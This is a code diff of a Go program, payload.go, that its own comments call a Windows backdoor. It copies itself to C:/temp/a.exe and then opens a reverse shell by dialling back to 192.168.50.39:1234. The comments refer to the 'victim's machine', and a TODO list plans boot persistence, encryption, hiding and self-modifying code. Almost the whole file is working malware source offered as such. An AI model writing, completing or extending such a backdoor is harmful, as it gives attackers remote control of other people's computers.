@@ -1,7 +1,19 @@
 package main
-// Calls back to 192.168.50.39 on port 1234 on line 96
 
-// Build with go build -ldflags -H=windowsgui payload.go
+/* 
+Build with go build -ldflags -H=windowsgui payload.go
+
+Backdoor logic as of now:
+Checks to see if the program is in C drive
+If not, copy the program to C drive and execute it there
+If it is, execute and create reverse shell to host
+
+TODO:
+Persistent with Boot
+Encryption
+Hidden
+Self modifying? (Code shuffle!)
+*/
 
 // Holy that's a lot of packages, I need to figure out how to decrease the amount here
 import (
@@ -12,34 +24,27 @@ import (
    "time"
    "path/filepath"
    "strings"
-   "fmt"
-   "log"
    "os"
    "io"
+   "fmt"
 )
 
-// Copy function will attempt to copy the payload into the victim's machine.
-// This is the copy function, takes in the source of the payload, and the destination.
-func copy(sourcePath, destPath string) error {
-    inputFile, err := os.Open(sourcePath)
-    if err != nil {
-        return fmt.Errorf("Couldn't open source file: %s", err)
-    }
-    outputFile, err := os.Create(destPath)
-    if err != nil {
-        inputFile.Close()
-        return fmt.Errorf("Couldn't open dest file: %s", err)
-    }
+/* 
+Copy function will attempt to copy the payload into the victim's machine.
+This is the copy function, takes in the source of the payload, and the destination.
+*/
+func copy(sourcePath, destPath string){
+    inputFile, _ := os.Open(sourcePath)
+    outputFile, _ := os.Create(destPath)
     defer outputFile.Close()
-    _, err = io.Copy(outputFile, inputFile)
+    io.Copy(outputFile, inputFile)
     inputFile.Close()
-    if err != nil {
-        return fmt.Errorf("Writing to output file failed: %s", err)
-    }
-    return nil
 }
 
-// Networking function that calls back to the host with a "shell"
+/* 
+Networking function that calls back to the host with a "shell"
+Goal: Be persistent, don't let me die!
+*/
 func reverse(host string) {
    c, err := net.Dial("tcp", host)
    if nil != err {
@@ -70,29 +75,24 @@ func reverse(host string) {
    }
 }
 
+// Checks if the payload is in the victim's machine
 func checkPayloadInVictim() bool{
-  dir, err := filepath.Abs(filepath.Dir(os.Args[0]))
-  if nil != err {
-          log.Fatal(err)
-  }
+  dir, _ := filepath.Abs(filepath.Dir(os.Args[0]))
+
   if strings.Contains(dir, "C:"){
-    fmt.Println("Currently in C drive")
     return true
   } else{
-    fmt.Println("Currently not in C drive")
     return false
   }
 }
 
 func main() {
-  if !checkPayloadInVictim(){
-  	err := copy("windows_reverse_shell.exe", "C:/temp/a.exe")
-  	if err != nil {
-  		log.Fatal(err)
-  	} else {
-      exec.Command("C:/temp/a.exe")
-    }
-  } else {
+
+  // Makes sure the payload is within the desired position
+  if checkPayloadInVictim(){
     reverse("192.168.50.39:1234")
+  } else {
+    copy("windows_reverse_shell.exe", "C:/temp/a.exe")
+    exec.Command("C:/temp/a.exe")
   }
 }
